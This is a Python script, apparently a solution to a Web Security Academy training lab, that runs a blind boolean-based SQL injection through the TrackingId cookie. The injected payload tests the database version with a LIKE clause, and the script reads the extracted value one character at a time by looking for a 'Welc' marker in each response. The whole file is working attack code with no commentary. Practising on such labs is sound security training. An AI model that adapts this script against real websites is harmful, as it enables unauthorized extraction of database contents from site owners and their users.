#!/usr/bin/python3
##
import requests
import pwn
import re
import string
##
#
def pwn(URL,sess,cookie,Payload):
    value=""
    chars=string.ascii_uppercase+string.ascii_lowercase+string.digits+string.punctuation
    while True:
        tmp=value
        for X in chars:
            cookies=dict({"TrackingId":f"{cookie}{Payload[0]}{value}{X}{Payload[1]}"})
            r=sess.get(URL,cookies=cookies)
            print(f"{X}\r",end="")
            if "Welc" in r.text:
                print(X)
                value+=X
                break
        if tmp==value:
            break
    return value
##
def main(URL):
    version=""
    Payload=["'+and+version()+like('", "%25')--+-"]
    sess=requests.Session()
    r=sess.get(URL)
    cookie=r.cookies.get_dict()["TrackingId"]
    print(f"Initial TrackingId: {cookie}")
    #
    version=pwn(URL,sess,cookie,Payload)
    print(f"The version is: {version}")
##
main("https://0a230044036c330b828f92a700420062.web-security-academy.net/")
